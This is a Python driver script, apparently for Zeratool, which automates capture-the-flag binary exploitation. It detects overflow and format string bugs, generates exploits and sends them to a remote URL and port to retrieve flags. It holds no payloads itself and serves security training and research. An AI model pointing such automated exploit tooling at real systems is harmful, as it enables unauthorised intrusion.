#!/usr/bin/env python
from __future__ import print_function
from shutil import which
import argparse
import logging
import os

from zeratool import formatDetector
from zeratool import formatLeak
from zeratool import inputDetector
from zeratool import overflowDetector
from zeratool import overflowExploiter
from zeratool import overflowExploitSender
from zeratool import protectionDetector
from zeratool import winFunctionDetector
from zeratool import formatExploiter

logging.basicConfig()
logging.root.setLevel(logging.INFO)

loud_loggers = [
    "angr.engines",
    "angr.sim_manager",
    "angr.simos",
    "angr.project",
    "angr.procedures",
    "cle",
    "angr.storage",
]

log = logging.getLogger(__name__)


def is_radare_installed():
    return which("r2") is not None


def main():

    if not is_radare_installed():
        log.info("[-] Error radare2 is not installed.")
        exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="File to analyze")
    parser.add_argument("-l", "--libc", help="libc to use")
    parser.add_argument("-u", "--url", help="Remote URL to pwn", default="")
    parser.add_argument("-p", "--port", help="Remote port to pwn", default="0")
    parser.add_argument(
        "-v", "--verbose", help="Verbose mode", action="store_true", default=False
    )
    parser.add_argument(
        "--force_shellcode",
        default=False,
        action="store_true",
        help="Set overflow pwn mode to point to shellcode",
    )

    parser.add_argument(
        "--format_only",
        default=False,
        action="store_true",
        help="Only run format strings check",
    )
    parser.add_argument(
        "--overflow_only",
        default=False,
        action="store_true",
        help="Only run overflow check",
    )

    args = parser.parse_args()
    if args.file is None:
        log.info("[-] Exitting no file specified")
        exit(1)
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    if not args.verbose:
        for loud_logger in loud_loggers:
            logging.getLogger(loud_logger).setLevel(logging.ERROR)

            logging.getLogger("angr.project").disabled = True

    # For stack problems where env gets shifted
    # based on path, using the abs path everywhere
    # makes it consistent
    args.file = os.path.abspath(args.file)

    # Detect problem type
    properties = {}
    properties["input_type"] = inputDetector.checkInputType(args.file)
    properties["libc"] = args.libc
    properties["file"] = args.file
    properties["force_shellcode"] = args.force_shellcode
    properties["pwn_type"] = {}
    properties["pwn_type"]["type"] = None
    log.info("[+] Checking pwn type...")
    if not args.format_only:
        log.info("[+] Checking for overflow pwn type...")
        properties["pwn_type"] = overflowDetector.checkOverflow(
            args.file, inputType=properties["input_type"]
        )
    if not args.overflow_only:
        if properties["pwn_type"]["type"] is None:
            log.info("[+] Checking for format string pwn type...")
            properties["pwn_type"] = formatDetector.checkFormat(
                args.file, inputType=properties["input_type"]
            )

    # Get problem mitigations
    log.info("[+] Getting binary protections")
    properties["protections"] = protectionDetector.getProperties(args.file)

    # Is it a leak based one?
    if properties["pwn_type"]["type"] == "Format":
        log.info("[+] Checking for flag leak")
        properties["pwn"] = formatLeak.checkLeak(args.file, properties)
        # Launch leak remotely
        if properties["pwn"]["flag_found"] and args.url != "":
            log.info("[+] Found flag through leaks locally. Launching remote exploit")
            log.info("[+] Connecting to {}:{}".format(args.url, args.port))
            properties["pwn"]["exploit"] = formatLeak.checkLeak(
                args.file,
                properties,
                remote_server=True,
                remote_url=args.url,
                port_num=int(args.port),
            )
        if properties["pwn"]["flag_found"]:
            exit(0)

    # Is there an easy win function
    properties["win_functions"] = winFunctionDetector.getWinFunctions(args.file)

    # Exploit overflows
    if properties["pwn_type"]["type"] == "Overflow":
        log.info("[+] Exploiting overflow")
        properties["pwn_type"]["results"] = {}
        properties["pwn_type"]["results"] = overflowExploiter.exploitOverflow(
            args.file, properties, inputType=properties["input_type"]
        )
        if properties["pwn_type"]["results"]["type"]:
            properties["send_results"] = overflowExploitSender.sendExploit(
                args.file, properties
            )
            if properties["send_results"]["flag_found"] and args.url != "":
                properties["remote_results"] = overflowExploitSender.sendExploit(
                    args.file,
                    properties,
                    remote_server=True,
                    remote_url=args.url,
                    port_num=int(args.port),
                )

    elif properties["pwn_type"]["type"] == "Format":
        properties["pwn_type"]["results"] = formatExploiter.exploitFormat(
            args.file, properties
        )
        if (
            properties["pwn_type"] is not None
            and "flag_found" in properties["pwn_type"].keys()
            and properties["pwn_type"]["results"]["flag_found"]
            and args.url != ""
        ):
            properties["pwn_type"]["send_results"] = formatExploiter.getRemoteFormat(
                properties, remote_url=args.url, remote_port=int(args.port)
            )
    else:
        log.info("[-] Can not determine vulnerable type")


if __name__ == "__main__":
    main()
